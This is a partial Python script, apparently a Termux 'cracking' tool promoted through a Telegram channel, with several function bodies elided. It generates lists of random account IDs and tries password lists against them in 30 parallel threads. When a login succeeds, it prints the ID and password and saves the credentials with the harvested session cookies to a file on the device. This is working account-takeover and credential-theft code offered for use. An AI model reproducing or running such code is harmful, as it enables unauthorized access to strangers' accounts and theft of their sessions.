#Sc Make By 𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠
#-----------Import Module------------#
from os import path
import os,base64,zlib,pip,urllib,sys,time,platform,pip,hashlib
os.system("clear");print("\n\n  \033[1;93m━━━━━𝑨𝒅𝒏𝒂𝒏_𝑨𝒍𝒘𝒂𝒚𝒔_𝑶𝒏_𝑭𝒊𝒓𝒆━━━━\n\n");time.sleep(3);os.system('xdg-open https://t.me/+PCHk9_nDCMM3NDI1')
try:
...
#-----------------------------------------------------#
sys.stdout.write('\x1b]2; ꧁☠[🔥]=[SCRIFT~GIFT]=[🔥]☠꧂\x07')
#-----------------------------------------------------#
#-----------Logo------------#
os.system('espeak -a 300 " I   AM   ADNAN,   THIS   TOOLS ON  FIRE  ,"')
os.system('clear')
priti = """ \033[1;92m
\x1b[97m\033[37;41m MY TELEGRAME CHANNEL →TERMUX SCRIPT GIFT← ALL JOIN   \033[0;m   \33[1;92m 
\033[1;37m █████╗ ██████╗ ███╗   ██╗ █████╗ ███╗   ██╗    ██╗  ██╗██╗███╗   ██╗ ██████╗     
\033[1;36m██╔══██╗██╔══██╗████╗  ██║██╔══██╗████╗  ██║    ██║ ██╔╝██║████╗  ██║██╔════╝     
\033[1;35m███████║██║  ██║██╔██╗ ██║███████║██╔██╗ ██║    █████╔╝ ██║██╔██╗ ██║██║  ███╗    
\033[1;33m██╔══██║██║  ██║██║╚██╗██║██╔══██║██║╚██╗██║    ██╔═██╗ ██║██║╚██╗██║██║   ██║    
\033[1;31m██║  ██║██████╔╝██║ ╚████║██║  ██║██║ ╚████║    ██║  ██╗██║██║ ╚████║╚██████╔╝    
\033[1;32m╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════o
           \033[1;33m ۝࿐ \033[38;5;85mSCRIPT~GIFT \033[93m࿐۝
 \033[1;93m۝࿐\x1b[97m════════════════════════════════════════\033[1;93m࿐۝\x1b[97m
      \x1b[93m  ━━━━━ 𝑨𝒅𝒏𝒂𝒏_𝑨𝒍𝒘𝒂𝒚𝒔_𝑶𝒏_𝑭𝒊𝒓𝒆 ━━━━
      \x1b[92m OWNER \x1b[93m : \x1b[92m 𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝     
 \033[1;93m۝࿐\x1b[97m════════════════════════════════════════\033[1;93m࿐۝\x1b[97m
"""
def lvl():
...
def admin_id():
	os.system('xdg-open https://t.me/+PCHk9_nDCMM3NDI1');clear();jannat()
def admin_page():
...
def jannat():
	...
	print(" \033[38;5;192m~\033[38;5;44m>\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m Gift Join Grupe Script")
...
def all_country():
	...
	for nmbr in range(limit):
		...
		user.append(nmp)
	with tred(max_workers=30) as 𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠:
		clear()
		tl = str(len(user))
		print(priti)
		lvl()
		...
		for psx in user:
			...
			𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠.submit(asha,ids,passlist)
	print('\n')
	lvl()
...
def asha(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r \033[1;91m [\033[1;32m𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-CRACK\033[1;91m] \033[1;93m%s\033[1;37m <> \033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r \033[1;31m [\033[1;92m𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-OK\033[1;91m] \033[1;92m'+uid+' > '+pas)
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				open('/sdcard/𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-RANDOM-OK-COOKIES.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
				oks.append(uid)
				break
